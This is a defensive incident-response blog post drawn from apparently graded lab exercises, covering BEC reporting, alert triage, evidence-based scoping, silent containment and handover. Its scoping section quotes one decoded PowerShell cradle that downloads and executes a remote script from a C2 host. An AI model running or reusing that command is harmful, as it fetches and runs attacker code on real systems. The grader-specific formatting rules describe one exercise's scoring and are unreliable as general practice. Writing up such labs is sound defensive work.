---
title: "Incident Response: From Alert to Handover"
date: 2026-11-17
tags: ["incident-response", "dfir", "soc", "bec", "threat-hunting", "blue-team"]
---

# Incident Response: From Alert to Handover

Incident response is a chain of decisions: what to report, how to rank it, what is actually in scope, how to contain without tipping the attacker off, and how to hand the result to someone who was not in the room. Every stage had a lesson.

<br />

## 1. Report each field independently

A business email compromise report was graded field by field. The anchors were concrete — the malicious forwarding address and the rule name — but the surrounding details mattered just as much.

- **Compare against the benign lookalike.** A user's newsletter rule used the same operation and had no forwarding address. That absence was the discriminator, not a different operation name.
- **One value per row.** I initially wrote prose descriptions. The grader wanted short canonical labels such as `Forwarding rule` or `eDiscovery export`.
- **Each row is one step.** A row describing two things registered as one event, and the other thing went missing. Bundling "delete the app and revoke the grant and reset the password" counted as a single step and lost two actions.

<div class="info-callout">
<strong>Rule:</strong> atomic rows, canonical labels. Precision is measured per field, not per paragraph.
</div>

<br />

---

## 2. Formatting is part of correctness

Several submissions failed on representation, not analysis.

- Attack-path rows required the exact timestamp format from the logs — `Jul 14, 2026 @ 05:41:00.000`. A shorter form like `Jul 14 05:41` did not parse, and rows missing the year were dropped.
- Placeholder text such as `<ROLE-GRANT TIMESTAMP>` was counted as noise. Fill it with a real value or remove the row entirely.

<br />

---

## 3. Triage the queue with logic, not guesswork

Faced with ten alerts to triage, the error messages themselves narrowed the answer. Combining two statements — "a true positive you marked false, a genuine detection is missing" and "a true positive you marked isn't supported" — pinned the problem down to exactly one flipped call.

The rest was threading and ranking:

- Link the alerts into a single incident thread rather than treating them as isolated events.
- Rank severity by impact — exfiltration and persistence at the top, not by alert order.

<br />

---

## 4. Scope by evidence, not by alert titles

Scoping taught me to distrust the obvious narrative.

- Decoding a base64 PowerShell cradle revealed `IEX (New-Object Net.WebClient).DownloadString('http://.../a.ps1')`, which gave up the C2 IP.
- The `dst_ip` on one alert matched the `src_ip` on another — both the same internal host. That host was the actual exfiltration source, not the server I had assumed from the alert titles.
- A decoy — a legitimate backup script invoked with `-File` — looked exactly like malicious PowerShell execution.
- The entry vector was phishing (`winword.exe` spawning `powershell.exe`), not the web exploit the alert name suggested. The evidence dictated the answer, not the label.

<div class="warning-callout">
<strong>Lesson:</strong> follow the data. An alert title is a hypothesis; IP correlations and process ancestry are evidence.
</div>

<br />

---

## 5. Contain silently, then eradicate

Containment has an ordering problem: loud actions warn the attacker before you have cut their access.

1. **Silent first:** isolate the host, block egress, revoke tokens.
2. **Loud second:** disable the account, reset passwords — only after silent controls are in place.

Eradication repeatedly failed because I invented artifacts. I described a scheduled task that was not in the logs, and proposed deleting a payload from disk when the payload had been loaded into memory with `IEX` and never written a file. Both were counted as fabrication. For an in-memory payload, **reimage the host** — there is no file to delete. And the foothold I kept missing was the exfiltration source itself: the host had to be included in eradication, not just containment.

<div class="warning-callout">
<strong>Never fabricate.</strong> Only submit what a log line proves. Invented mechanisms are noise and drive precision failures.
</div>

<br />

---

## 6. Hand over something someone can run cold

A good handover is specific and actionable:

- "Eradication ongoing" is not a status. "The web host has not been rebuilt — the traversal foothold and exfil source are still standing" is an open thread someone can act on.
- Watch items should map 1:1 to observed techniques, so re-detection is immediate if the attacker returns.
- The executive summary should describe **business impact only** — no hostnames, no IPs, no tool names. The audience determines the abstraction.

<br />

---

## The through-line

Across all of it: read the error text, keep rows atomic, prefer behavior over indicators, verify your schema, and let evidence — not assumptions — decide the answer.
